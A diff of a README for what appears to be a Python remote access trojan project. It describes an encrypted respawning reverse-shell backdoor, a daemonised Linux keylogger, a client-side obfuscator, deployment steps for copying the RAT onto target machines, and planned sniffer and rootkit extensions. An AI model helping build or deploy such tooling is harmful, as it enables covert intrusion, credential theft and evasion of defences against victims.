@@ -5,31 +5,30 @@
 </p>
 
 ## Architecture
-
+### Backbone branch
 ### Master
-* interface - server menu
+* interface - server menu and server cli scripting
 * threadpool - running paralel code to serve menu while waiting and handling connections set to up to 20 by default
 * tools - backdoor :: encrypted reverse shell 30s RAT connection with respawn and client-side
-* utils - command line interface, encryption methods and connection methods
-> python3 __main__.py <server_ip_addr> <rat_port> <shell_port>
+* utils - encryption methods and connection methods
+> cd master && python3 main.py <server_ip_addr> <rat_port> <shell_port>
 ### _________________________________________________________________________
 
 ### Slave
-* tools - RAT client; linux C keylogger with daemonisation (must be rooted)
-* utils - command line interface, encryption methods and connection methods
+* interface - client cli scripting
+* tools - RAT client backdoor
+* utils - encryption methods and connection methods
 * obfuscator - obfuscator for client side RAT deployement
-> python3 __main__.py <server_ip_addr> <rat_port>
+> server :: python3 obfuscator.py && <copy ratpy.py to slave machine>
+> python3 ratpy.py <server_ip_addr> <rat_port>
 ### _________________________________________________________________________
 
-## Development
-* [x] add cat and ls with path arg
-* [x] split into classes both master and client
-* [x] encrypt communication
-* [x] threading pool stable for one connection
-* [x] linux keylogger extension
-* [x] multithread to accept multiple connections and hold 
-* [x] encrypt shell connection
-* [x] rebirth slave every t seconds and recconect to master 
-* [ ] obfuscate backdoor interpreter and keylogger 
-* [ ] sniffer extension
-* [ ] rookit extension
+## Adding extensions
+* to be written in a new future
+
+## Development to v1.0
+* [ ] clean up code, refactor and move args.py to interface
+* [ ] write client obfuscator
+* [ ] open master branch with binary tools for remote deployment
+* [ ] document adding extensions
+
